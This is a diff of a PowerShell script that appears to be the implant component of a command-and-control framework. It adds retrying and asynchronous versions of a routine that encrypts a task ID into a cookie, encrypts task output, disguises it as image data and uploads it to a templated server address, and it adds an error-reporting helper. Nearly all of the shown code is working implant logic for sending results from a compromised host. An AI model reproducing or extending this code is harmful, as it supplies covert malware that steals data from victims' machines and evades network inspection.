@@ -116,7 +116,6 @@ function Encrypt-String($key, $unencryptedString) {
     $encryptor = $aesManaged.CreateEncryptor()
     $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
     [byte[]] $fullData = $aesManaged.IV + $encryptedData
-    #$aesManaged.Dispose()
     [System.Convert]::ToBase64String($fullData)
 }
 function Encrypt-Bytes($key, $bytes) {
@@ -164,22 +163,55 @@ function Decrypt-String2($key, $encryptedStringWithIV) {
     $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
     $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
     $output
-    #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
 }
 
 function Send-Response($Server, $Key, $TaskId, $Data) {
-  try{
-    $eid = Encrypt-String $Key $TaskId
-    $Output = Encrypt-String2 $Key $Data
-    $UploadBytes = getimgdata $Output
-    (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
-  } catch {
-    Write-Host "ErrorResponse: " + $error[0]
+    $attempts = 0
+    while ($attempts -lt 5) {
+      $attempts += 1;
+      try
+      {
+        $eid = Encrypt-String $Key $TaskId
+        $Output = Encrypt-String2 $Key $Data
+        $UploadBytes = getimgdata $Output
+        (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
+        $attempts = 5;
+      }
+      catch
+      {
+        Write-Output "ErrorResponse: " + $error[0]
+        Write-Output(Resolve-Error)
+      }
+    }
+  }
+  
+function Send-ResponseAsync($Server, $Key, $TaskId, $Data) 
+{
+  try
+  {
+      $eid = Encrypt-String $Key $TaskId
+      $Output = Encrypt-String2 $Key $Data
+      $UploadBytes = getimgdata $Output    
+      $wc=(Get-Webclient -Cookie $eid)
+      #$Job = Register-ObjectEvent -InputObject $wc -EventName "UploadDataCompleted" -Action {}
+      $wc.UploadDataAsync("$Server", $UploadBytes)|out-null
+  } 
+  catch 
+  {
+    Write-Output "ErrorResponse: " + $error[0]
+    Write-Output(Resolve-Error)
   }
 }
-
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-
+function Resolve-Error ($ErrorRecord=$Error[0])
+{
+   $ErrorRecord | Format-List * -Force
+   $ErrorRecord.InvocationInfo |Format-List *
+   $Exception = $ErrorRecord.Exception
+   for ($i = 0; $Exception; $i++, ($Exception = $Exception.InnerException))
+   {   "$i" * 80
+       $Exception |Format-List * -Force
+   }
+}
 $URI= "%s"
 $Server = "$s/%s"
 $ServerClean = "$sc"
